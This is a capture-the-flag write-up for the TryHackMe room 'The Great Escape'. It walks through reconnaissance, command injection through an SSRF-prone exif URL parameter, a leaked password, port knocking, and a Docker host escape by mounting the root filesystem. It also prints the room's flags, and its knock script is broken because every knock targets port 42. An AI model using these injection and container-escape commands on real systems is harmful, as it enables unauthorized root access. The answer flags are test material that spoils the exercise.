> The Great Escape

**export IP=10.10.128.135**

# Nmap

nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp    open     ssh?    syn-ack
| fingerprint-strings: 
|   GenericLines: 
|_    K'0E;Jomb]e-bQT&p-fHN3R7
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open     http    syn-ack     nginx 1.19.6
|_http-server-header: nginx/1.19.6
|_http-title: 503 Service Temporarily Unavailable
|_http-trane-info: Problem with XML parsing of /evox/about
```

# Nikto 

nitko -h http://$IP

```
+ Entry '/api/' in robots.txt returned a non-forbidden or redirect HTTP code (503)
+ Entry '/*.bak.txt$' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
```

# Gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial -x txt,php,sql,bak,tar,cgi,bin,zip,js

```
Nothing
```

Looks like rate limiting is present. And we can't bruteforce passwords too!

# robots.txt

```
User-agent: *
Allow: /
Disallow: /api/
# Disallow: /exif-util
Disallow: /*.bak.txt$
```

## Hint

Some well known files may offer some help

Here the creator is using security.txt file in .well_known directory.

We can curl the request.

curl http://$IP/.well-known/security.txt

```
Hey you found me!

The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.

See https://securitytxt.org/ for more information.

Ping /api/fl46 with a HEAD request for a nifty treat.
```

curl -I http://$IP/api/fl46

```
HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Sat, 27 Feb 2021 09:47:12 GMT
Connection: keep-alive
flag: THM{b801135794bf1ed3a2aafaa44c2e5ad4}
```

We can now investigate `exif-util`. We can use wappalyzer and find that we are running vue.js, node.js and Nuxt.js. Let's try some basic js shell and we are not successful. We can't upload malicious images too. Now moving on to url.

We can set up a python server locally and try to insert the URL of our image it works and it gives a proper api call. 

`GET http://10.10.15.29/api/exif?url=http://10.8.107.21:8000/deku.jpg`

Some people use system call instead of curl. Let's try basic command injection.

curl http://10.10.15.29/api/exif?url=http://127.0.0.1/deku.jpg;id

```
uid=1001(n00bmast3r) gid=1001(n00bmast3r) groups=1001(n00bmast3r),27(sudo)
```

It's reflecting my own. And moving on to `exif-util.bak.txt`. We got exif-util and then .bak.txt$ but exif-util commented out. So we are accessing `exif-util.bak.txt`.

curl http://$IP/exif-util.bak.txt

And we got a vulnerable piece of code.

```
const response = await this.$axios.$get('http://api-dev-backup:8080/exif',
```

Looks like this is a valid API call. Let's combine both.

curl "http://$IP/api/exif?url=http://api-dev-backup:8080/exif?url=1;id"

We are executing as root but it is a docker environment we have to escape it!

By writing a simple python code we have mininum code execution.

python3 shell.py "cd /root;ls" => dev-note.txt

# dev-note.txt

```
Hey guys,

Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.

Anyways, the password is fluffybunnies123

Cheers,

Hydra
```

curl -v http://$IP/api/login -d '{"username"\:"hydra","password"\:"fluffybunnies123"}' -H "Content-Type: application/json"

But error. And enumerating ssh now.

ssh -v hydra@$IP => Gives us random errors and looks like it is a hineypot `endlessh`, an SSH Tarpit.

python3 shell.py "cd /root;ls -la"

We got a .git directory. Let's look at the logs.

python3 shell.py "git -C /root log"

```
commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes
```

python3 shell.py "git -C /root show a3d30a7d0510dc6565ff9316e3fb84434916dee8"

```
+Hey guys,
+
+I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+
+Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+
+Cheers,
+
+Hydra
\ No newline at end of file
diff --git a/flag.txt b/flag.txt
new file mode 100644
index 0000000..aae8129
--- /dev/null
+++ b/flag.txt
@@ -0,0 +1,3 @@
+You found the root flag, or did you?
+
+THM{0cb4b947043cb5c0486a454b75a10876}
\ No newline at end of file
```

We can port knock using knockd or our own script.

# knock.sh

```
#!/bin/bash

curl $IP:42 -m 42
sleep 1
curl $IP:42 -m 1337
sleep 1
curl $IP:42 -m 10420
sleep 1
curl $IP:42 -m 6969
sleep 1
curl $IP:42 -m 63000
sleep 1
```

or just `knockd $IP 42 1337 10420 6969 63000`

Now we have docker daemon running at port 2375. We can run commands in docker to escape it.

docker -H tcp://$IP:2375 ps
docker -H tcp://$IP:2375 images => We got alpine image

We don't have to mount the image we can gain a shell using the following command.

docker -H tcp://$IP:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh

# root.txt

```
THM{c62517c0cad93ac93a92b1315a32d734}
```